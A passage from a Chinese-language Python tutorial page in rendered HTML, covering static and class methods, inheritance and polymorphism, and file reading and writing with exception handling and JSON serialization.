class="hljs-keyword">if</span> self._age &lt;= <span class="hljs-number">16</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;%s正在玩飞行棋.&#x27;</span> % self._name)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;%s正在玩斗地主.&#x27;</span> % self._name)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    person = Person(<span class="hljs-string">&#x27;王大锤&#x27;</span>, <span class="hljs-number">22</span>)<br>    person.play()<br>    person._gender = <span class="hljs-string">&#x27;男&#x27;</span><br>    <span class="hljs-comment"># AttributeError: &#x27;Person&#x27; object has no attribute &#x27;_is_gay&#x27;</span><br>    <span class="hljs-comment"># person._is_gay = True</span><br></code></pre></td></tr></table></figure></blockquote><h4 id="静态方法和类方法"><a href="#静态方法和类方法" class="headerlink" title="静态方法和类方法"></a>静态方法和类方法</h4><p><strong>静态方法</strong>：无需实例化类即可调用方法，**@staticmethod**。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment"># -*- coding: UTF-8 -*-</span><br> <br><span class="hljs-keyword">class</span> <span class="hljs-title class_">C</span>(<span class="hljs-title class_ inherited__">object</span>):<br><span class="hljs-meta">    @staticmethod</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">f</span>():<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;runoob&#x27;</span>);<br> <br>C.f();          <span class="hljs-comment"># 静态方法无需实例化</span><br>cobj = C()<br>cobj.f()        <span class="hljs-comment"># 也可以实例化后调用</span><br></code></pre></td></tr></table></figure><p><strong>类方法</strong>：**@classmethod**</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment"># -*- coding: UTF-8 -*-</span><br> <br><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    bar = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">func1</span>(<span class="hljs-params">self</span>):  <br>        <span class="hljs-built_in">print</span> (<span class="hljs-string">&#x27;foo&#x27;</span>) <br><span class="hljs-meta">    @classmethod</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">func2</span>(<span class="hljs-params">cls</span>):<br>        <span class="hljs-built_in">print</span> (<span class="hljs-string">&#x27;func2&#x27;</span>)<br>        <span class="hljs-built_in">print</span> (cls.bar)<br>        cls().func1()   <span class="hljs-comment"># 调用 foo 方法</span><br> <br>A.func2()               <span class="hljs-comment"># 不需要实例化</span><br></code></pre></td></tr></table></figure><h4 id="继承和多态"><a href="#继承和多态" class="headerlink" title="继承和多态"></a>继承和多态</h4><p>我们可以在已有类的基础上创建新类，这其中的一种做法就是让一个类从另一个类那里将属性和方法直接<strong>继承</strong>下来，从而减少重复代码的编写。</p><p>提供继承信息的我们称之为<strong>父类</strong>，也叫超类或基类；得到继承信息的我们称之为<strong>子类</strong>，也叫派生类或衍生类。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;人&quot;&quot;&quot;</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name, age</span>):<br>        self._name = name<br>        self._age = age<br><br><span class="hljs-meta">    @property</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">name</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> self._name<br><br><span class="hljs-meta">    @property</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">age</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> self._age<br><br><span class="hljs-meta">    @age.setter</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">age</span>(<span class="hljs-params">self, age</span>):<br>        self._age = age<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">play</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;%s正在愉快的玩耍.&#x27;</span> % self._name)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">watch_av</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">if</span> self._age &gt;= <span class="hljs-number">18</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;%s观看《功夫足球》.&#x27;</span> % self._name)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;%s观看《熊出没》.&#x27;</span> % self._name)<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span>(<span class="hljs-title class_ inherited__">Person</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;学生&quot;&quot;&quot;</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name, age, grade</span>):<br>        <span class="hljs-built_in">super</span>().__init__(name, age)<br>        self._grade = grade<br><br><span class="hljs-meta">    @property</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">grade</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> self._grade<br><br><span class="hljs-meta">    @grade.setter</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">grade</span>(<span class="hljs-params">self, grade</span>):<br>        self._grade = grade<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">study</span>(<span class="hljs-params">self, course</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;%s的%s正在学习%s.&#x27;</span> % (self._grade, self._name, course))<br><br></code></pre></td></tr></table></figure><p>通过方法重写我们可以让父类的同一个行为在子类中拥有不同的实现版本，当我们调用这个经过子类重写的方法时，不同的子类对象会表现出不同的行为，这个就是<strong>多态（poly-morphism）</strong>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> abc <span class="hljs-keyword">import</span> ABCMeta, abstractmethod<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Pet</span>(<span class="hljs-built_in">object</span>, metaclass=ABCMeta):<br>    <span class="hljs-string">&quot;&quot;&quot;宠物&quot;&quot;&quot;</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, nickname</span>):<br>        self._nickname = nickname<br><br><span class="hljs-meta">    @abstractmethod</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">make_voice</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;发出声音&quot;&quot;&quot;</span><br>        <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Dog</span>(<span class="hljs-title class_ inherited__">Pet</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;狗&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">make_voice</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;%s: 汪汪汪...&#x27;</span> % self._nickname)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Cat</span>(<span class="hljs-title class_ inherited__">Pet</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;猫&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">make_voice</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;%s: 喵...喵...&#x27;</span> % self._nickname)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    pets = [Dog(<span class="hljs-string">&#x27;旺财&#x27;</span>), Cat(<span class="hljs-string">&#x27;凯蒂&#x27;</span>), Dog(<span class="hljs-string">&#x27;大黄&#x27;</span>)]<br>    <span class="hljs-keyword">for</span> pet <span class="hljs-keyword">in</span> pets:<br>        pet.make_voice()<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main()<br></code></pre></td></tr></table></figure><hr><h3 id="文件读写"><a href="#文件读写" class="headerlink" title="文件读写"></a>文件读写</h3><p><strong>文件读写</strong>：open函数</p><p>read()：读</p><p>write()：写入</p><p>close()：关闭文件</p><table><thead><tr><th>操作模式</th><th>具体含义</th></tr></thead><tbody><tr><td><code>&#39;r&#39;</code></td><td>读取 （默认）</td></tr><tr><td><code>&#39;w&#39;</code></td><td>写入（会先截断之前的内容）</td></tr><tr><td><code>&#39;x&#39;</code></td><td>写入，如果文件已经存在会产生异常</td></tr><tr><td><code>&#39;a&#39;</code></td><td>追加，将内容写入到已有文件的末尾</td></tr><tr><td><code>&#39;b&#39;</code></td><td>二进制模式</td></tr><tr><td><code>&#39;t&#39;</code></td><td>文本模式（默认）</td></tr><tr><td><code>&#39;+&#39;</code></td><td>更新（既可以读又可以写）</td></tr></tbody></table><p><strong>捕获异常：try…except</strong></p><p>（<a href="https://www.runoob.com/python/python-exceptions.html?_t_t_t=0.9078544684529848">python标准异常查询</a>）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    f = <span class="hljs-literal">None</span><br>    <span class="hljs-keyword">try</span>:<br>        f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./src/生如夏花.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>        <span class="hljs-built_in">print</span>(f.read())<br>    <span class="hljs-keyword">except</span> FileNotFoundError:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;无法打开指定的文件!&#x27;</span>)<br>    <span class="hljs-keyword">except</span> LookupError:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;指定了未知的编码!&#x27;</span>)<br>    <span class="hljs-keyword">except</span> UnicodeDecodeError:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;读取文件时解码错误!&#x27;</span>)<br>    <span class="hljs-keyword">finally</span>:<br>        <span class="hljs-keyword">if</span> f:<br>            f.close()<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main()<br></code></pre></td></tr></table></figure><blockquote><p>由于<code>finally</code>块的代码不论程序正常还是异常都会执行到。</p><p>（甚至是调用了<code>sys</code>模块的<code>exit</code>函数退出Python环境，<code>finally</code>块都会被执行，因为<code>exit</code>函数实质上是引发了<code>SystemExit</code>异常）</p><p>因此我们通常把<code>finally</code>块称为“总是执行代码块”，它最适合用来做释放外部资源的操作。</p><p>如果不愿意在<code>finally</code>代码块中关闭文件对象释放资源，也可以使用上下文语法，通过<code>with</code>关键字指定文件对象的上下文环境并在离开上下文环境时自动释放文件资源，</p></blockquote><p>使用 <strong>with</strong> 关键字系统会自动调用 f.close() 方法， with 的作用等效于 try&#x2F;finally 语句是一样的。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./src/生如夏花.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>            <span class="hljs-built_in">print</span>(f.read())<br>    <span class="hljs-keyword">except</span> FileNotFoundError:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;无法打开指定的文件!&#x27;</span>)<br>    <span class="hljs-keyword">except</span> LookupError:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;指定了未知的编码!&#x27;</span>)<br>    <span class="hljs-keyword">except</span> UnicodeDecodeError:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;读取文件时解码错误!&#x27;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main()<br></code></pre></td></tr></table></figure><p>除了read（）外，也可使用**<code>for-in</code>循环读取<strong>、或者</strong><code>readlines</code>方法**将文件按行读取到一个列表容器。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#一次性读取</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./src/生如夏花.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    <span class="hljs-built_in">print</span>(f.read())<br><span class="hljs-comment">#for-in循环读取</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./src/生如夏花.txt&#x27;</span>, mode=<span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> f:<br>        <span class="hljs-built_in">print</span>(line,end=<span class="hljs-string">&#x27;&#x27;</span>)<br>        time.sleep(<span class="hljs-number">0.5</span>)<br>    <span class="hljs-built_in">print</span>()<br><span class="hljs-comment">#readlines按行读取</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./src/生如夏花.txt&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    lines = f.readlines()<br><span class="hljs-built_in">print</span>(lines)<br></code></pre></td></tr></table></figure><p><strong>assert断言</strong>：判断表达式，false时抛出异常</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">assert</span> expression [, arguments]<br><span class="hljs-comment">#等价于</span><br><span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> expression:<br>    <span class="hljs-keyword">raise</span> AssertionError(arguments)<br></code></pre></td></tr></table></figure><p><strong>写入文件</strong>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> math <span class="hljs-keyword">import</span> sqrt<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">is_prime</span>(<span class="hljs-params">n</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;判断素数的函数&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">assert</span> n &gt; <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> factor <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>, <span class="hljs-built_in">int</span>(sqrt(n)) + <span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">if</span> n % factor == <span class="hljs-number">0</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span> <span class="hljs-keyword">if</span> n != <span class="hljs-number">1</span> <span class="hljs-keyword">else</span> <span class="hljs-literal">False</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    filenames = (<span class="hljs-string">&#x27;a.txt&#x27;</span>, <span class="hljs-string">&#x27;b.txt&#x27;</span>, <span class="hljs-string">&#x27;c.txt&#x27;</span>)<br>    file_list = []<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">for</span> filename <span class="hljs-keyword">in</span> filenames:<br>            file_list.append(<span class="hljs-built_in">open</span>(filename, <span class="hljs-string">&#x27;w&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>        <span class="hljs-keyword">for</span> number <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">10000</span>):<br>            <span class="hljs-keyword">if</span> is_prime(number):<br>                <span class="hljs-keyword">if</span> number &lt; <span class="hljs-number">100</span>:<br>                    file_list[<span class="hljs-number">0</span>].write(<span class="hljs-built_in">str</span>(number)+<span class="hljs-string">&#x27;\n&#x27;</span>)<br>                <span class="hljs-keyword">elif</span> number &lt;<span class="hljs-number">1000</span>:<br>                    file_list[<span class="hljs-number">1</span>].write(<span class="hljs-built_in">str</span>(number)+<span class="hljs-string">&#x27;\n&#x27;</span>)<br>                <span class="hljs-keyword">else</span>:<br>                    file_list[<span class="hljs-number">2</span>].write(<span class="hljs-built_in">str</span>(number)+<span class="hljs-string">&#x27;\n&#x27;</span>)<br>    <span class="hljs-keyword">except</span> IOError <span class="hljs-keyword">as</span> ex:<br>        <span class="hljs-built_in">print</span>(ex)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;写文件出现错误&quot;</span>)<br>    <span class="hljs-keyword">finally</span>:<br>        <span class="hljs-keyword">for</span> fs <span class="hljs-keyword">in</span> file_list:<br>            fs.close()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;操作完成！&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main()<br></code></pre></td></tr></table></figure><p><strong>读取二进制文件</strong>（例如图片）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">try</span>:<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./game/ball.png&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> fs1:<br>        data = fs1.read()<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(data)) <span class="hljs-comment">#&lt;class &#x27;bytes&#x27;&gt;</span><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;copy_ball.png&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> fs2:<br>        <span class="hljs-comment">#复制图片</span><br>        fs2.write(data)<br><span class="hljs-keyword">except</span> FileNotFoundError <span class="hljs-keyword">as</span> e:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;指定的文件无法打开&quot;</span>)<br><span class="hljs-keyword">except</span> IOError <span class="hljs-keyword">as</span> e:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;读写文件出现错误&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;执行结束&#x27;</span>)<br></code></pre></td></tr></table></figure><p><strong>读取JSON文件</strong>：</p><blockquote><p>JSON是“JavaScript Object Notation”的缩写，它本来是JavaScript语言中创建对象的一种字面量语法，现在已经被广泛的应用于跨平台跨语言的数据交换。</p><p>原因很简单，因为JSON也是纯文本，任何系统任何编程语言处理纯文本都是没有问题的。目前JSON基本上已经取代了XML作为异构系统间交换数据的事实标准。</p><p>关于JSON的知识，更多的可以参考<a href="http://json.org/">JSON的官方网站</a>，从这个网站也可以了解到每种语言处理JSON数据格式可以使用的工具或三方库，下面是一个JSON的简单例子。</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs prolog">&#123;<br>    <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;骆昊&quot;</span>,<br>    <span class="hljs-string">&quot;age&quot;</span>: <span class="hljs-number">38</span>,<br>    <span class="hljs-string">&quot;qq&quot;</span>: <span class="hljs-number">957658</span>,<br>    <span class="hljs-string">&quot;friends&quot;</span>: [<span class="hljs-string">&quot;王大锤&quot;</span>, <span class="hljs-string">&quot;白元芳&quot;</span>],<br>    <span class="hljs-string">&quot;cars&quot;</span>: [<br>        &#123;<span class="hljs-string">&quot;brand&quot;</span>: <span class="hljs-string">&quot;BYD&quot;</span>, <span class="hljs-string">&quot;max_speed&quot;</span>: <span class="hljs-number">180</span>&#125;,<br>        &#123;<span class="hljs-string">&quot;brand&quot;</span>: <span class="hljs-string">&quot;Audi&quot;</span>, <span class="hljs-string">&quot;max_speed&quot;</span>: <span class="hljs-number">280</span>&#125;,<br>        &#123;<span class="hljs-string">&quot;brand&quot;</span>: <span class="hljs-string">&quot;Benz&quot;</span>, <span class="hljs-string">&quot;max_speed&quot;</span>: <span class="hljs-number">320</span>&#125;<br>    ]<br>&#125;<br></code></pre></td></tr></table></figure></blockquote><p>JSON的数据类型和Python的数据类型很容易找到对应关系：</p><table><thead><tr><th>Python</th><th>JSON</th></tr></thead><tbody><tr><td>dict</td><td>object</td></tr><tr><td>list, tuple</td><td>array</td></tr><tr><td>str</td><td>string</td></tr><tr><td>int, float, int- &amp; float-derived Enums</td><td>number</td></tr><tr><td>True &#x2F; False</td><td>true &#x2F; false</td></tr><tr><td>None</td><td>null</td></tr></tbody></table><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    mydict = &#123;<br>        <span class="hljs-string">&#x27;name&#x27;</span>: <span class="hljs-string">&#x27;骆昊&#x27;</span>,<br>        <span class="hljs-string">&#x27;age&#x27;</span>: <span class="hljs-number">38</span>,<br>        <span class="hljs-string">&#x27;qq&#x27;</span>: <span class="hljs-number">957658</span>,<br>        <span class="hljs-string">&#x27;friends&#x27;</span>: [<span class="hljs-string">&#x27;王大锤&#x27;</span>, <span class="hljs-string">&#x27;白元芳&#x27;</span>],<br>        <span class="hljs-string">&#x27;cars&#x27;</span>: [<br>            &#123;<span class="hljs-string">&#x27;brand&#x27;</span>: <span class="hljs-string">&#x27;BYD&#x27;</span>, <span class="hljs-string">&#x27;max_speed&#x27;</span>: <span class="hljs-number">180</span>&#125;,<br>            &#123;<span class="hljs-string">&#x27;brand&#x27;</span>: <span class="hljs-string">&#x27;Audi&#x27;</span>, <span class="hljs-string">&#x27;max_speed&#x27;</span>: <span class="hljs-number">280</span>&#125;,<br>            &#123;<span class="hljs-string">&#x27;brand&#x27;</span>: <span class="hljs-string">&#x27;Benz&#x27;</span>, <span class="hljs-string">&#x27;max_speed&#x27;</span>: <span class="hljs-number">320</span>&#125;<br>        ]<br>    &#125;<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;data.json&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> fs:<br>            json.dump(mydict, fs)<br>    <span class="hljs-keyword">except</span> IOError <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(e)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;保存数据完成!&#x27;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main()<br></code></pre></td></tr></table></figure><p>json模块主要有四个比较重要的函数，分别是：</p><ul><li><code>dump</code> - 将Python对象按照JSON格式序列化到文件中</li><li><code>dumps</code> - 将Python对象处理成JSON格式的字符串</li><li><code>load</code> - 将文件中的JSON数据反序列化成对象</li><li><code>loads</code> - 将字符串的内容反序列化成Python对象</li></ul><blockquote><p>这里出现了两个概念，一个叫序列化，一个叫反序列化。</p><p><a href="https://zh.wikipedia.org/">维基百科</a>上对这两个概念是这样解释的：</p><p>“<strong>序列化（serialization）</strong>在计算机科学的数据处理中，是指将<strong>数据结构或对象状态转换为可以存储或传输的形式</strong>，这样在需要的时候能够恢复到原先的状态，而且通过序列化的数据重新获取字节时，可以利用这些字节来产生原始对象的副本（拷贝）。与这个过程相反的动作，即<strong>从一系列字节中提取数据结构</strong>的操作，就是<strong>反序列化（deserialization）</strong>”。</p><p>目前绝大多数网络数据服务（或称之为网络API）都是基于<a href="https://zh.wikipedia.org/wiki/%E8%B6%85%E6%96%87%E6%9C%AC%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE">HTTP协议</a>提供JSON格式的数据。</p><p>关于HTTP协议的相关知识，可以看看阮一峰老师的<a href="http://www.ruanyifeng.com/blog/2016/08/http.html">《HTTP协议入门》</a>，如果想了解国内的网络数据服务，可以看看<a 